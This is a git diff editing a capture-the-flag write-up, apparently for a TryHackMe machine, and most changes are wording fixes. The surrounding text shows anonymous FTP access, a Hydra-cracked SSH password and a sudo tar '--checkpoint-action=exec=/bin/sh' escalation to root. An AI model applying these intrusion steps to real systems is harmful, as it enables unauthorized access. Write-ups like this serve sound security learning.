@@ -74,10 +74,11 @@ by OJ Reeves (@TheClonia1) & Christian Mehlmauer (@firefart)
 /images             (Status: 301) [Size: 313] [--> http://10.10.162.62/images/] 
 Progress: 1062 / 220561 (0.48%) 
 ```
+Even though I let it finish, I didn´t find anything of interest.
+
 ## Enumeration
 
-Even though I let it finish, I didn´t find anything of interest.
-So on to the next option, FTP. In the nmap scan we saw that anonymous login is enabled, so let´s log in:
+So on to the next option, FTP. In the NMAP scan we saw that anonymous login is enabled, so let´s log in:
 ```bash
 $ ftp 10.10.162.62 21
 Connected to 10.10.162.62.
@@ -165,8 +166,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-10 10:02:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-10 10:02:29
 ```
 
-And we´ve got: login: lin   password: RedDr4gonSynd1cat3. <br>
-Now just login to SSH:
+And we´ve got: 'login: lin' and 'password: RedDr4gonSynd1cat3'. Now just login to SSH:
 ```bash
 $ ssh lin@10.10.162.62           
 The authenticity of host '10.10.162.62 (10.10.162.62)' can't be established.
@@ -192,8 +192,8 @@ THM{CR1M3_SyNd1C4T3}
 ```
 ## Privilege Escalation
 We immediately got the user flag. Now we start with privilege escalation to become root.
-I usually start out by checking ```sudo -l``` and got lucky.
-We can abuse the tar functionality of setting checkpoints. the ```checkpoint=1```creates the checkpoint before reading the Nth record. In our case the checkpoint is done immediately. The ```--checkpoint-action=exec=/bin/sh``` is an action done within that checkpoint. In our case we create a shell and since the process is executedwith sudo, we get root access, hurray!
+I usually start by checking ```sudo -l``` and got lucky.
+We can abuse the tar functionality of setting checkpoints. the ```checkpoint=1```creates the checkpoint before reading the Nth record. In our case, the checkpoint is done immediately. The ```--checkpoint-action=exec=/bin/sh``` is an action done within that checkpoint. In our case, we create a shell and since the process is executed with sudo, we get root access, hurray!
 So just find the root directory and then the flag.
 
 ```bash
